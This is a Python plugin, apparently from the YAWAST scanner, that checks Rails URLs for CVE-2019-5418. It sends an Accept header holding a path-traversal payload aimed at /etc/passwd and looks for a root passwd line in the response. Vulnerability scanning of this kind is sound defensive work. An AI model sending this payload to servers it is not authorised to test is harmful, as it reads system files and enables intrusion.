import re
from typing import List

from yawast.reporting.enums import Vulnerabilities
from yawast.scanner.plugins.http import response_scanner
from yawast.scanner.plugins.result import Result
from yawast.shared import network, output

_checked: List[str] = []


def reset():
    global _checked

    _checked = []


def check_cve_2019_5418(url: str) -> List[Result]:
    global _checked

    # this only applies to controllers, so skip the check unless the link ends with '/'
    if not url.endswith("/") or url in _checked:
        return []

    results: List[Result] = []
    _checked.append(url)

    try:
        res = network.http_get(
            url, False, {"Accept": "../../../../../../../../../e*c/p*sswd{{"}
        )
        body = res.text
        req = network.http_build_raw_request(res.request)

        results += response_scanner.check_response(url, res)

        pattern = r"root:[a-zA-Z0-9]+:0:0:.+$"
        mtch = re.search(pattern, body)

        if mtch:
            results.append(
                Result(
                    f"Rails CVE-2019-5418: File Content Disclosure: {url} - {mtch.group(0)}",
                    Vulnerabilities.SERVER_RAILS_CVE_2019_5418,
                    url,
                    [body, req],
                )
            )
    except Exception:
        output.debug_exception()

    return results
